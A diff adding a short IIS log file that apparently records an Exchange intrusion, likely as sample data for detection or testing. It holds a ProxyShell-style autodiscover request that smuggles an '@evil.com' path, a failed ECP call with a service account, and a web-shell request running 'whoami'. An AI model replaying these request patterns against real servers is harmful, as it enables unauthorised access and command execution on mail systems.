@@ -1,0 +1,8 @@
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2026-11-02 08:00:00
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status time-taken
+2026-11-02 08:15:30 10.0.0.5 GET /owa/auth/logon.aspx replaceCurrent=1 443 - 203.0.113.7 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64) 200 0 0 15
+2026-11-02 08:15:31 10.0.0.5 POST /autodiscover/autodiscover.json @evil.com/owa/?&Email=autodiscover/autodiscover.json%3F@evil.com 443 - 198.51.100.23 python-requests/2.31.0 200 0 0 31
+2026-11-02 08:15:33 10.0.0.5 POST /ecp/DDI/DDIService.svc/GetList - 443 CORP\svc-backup 198.51.100.23 python-requests/2.31.0 401 1 2148074254 8
+2026-11-02 08:15:40 10.0.0.5 GET /aspnet_client/system_web/shell.aspx cmd=whoami 443 - 198.51.100.23 curl/8.4.0 200 0 0 4
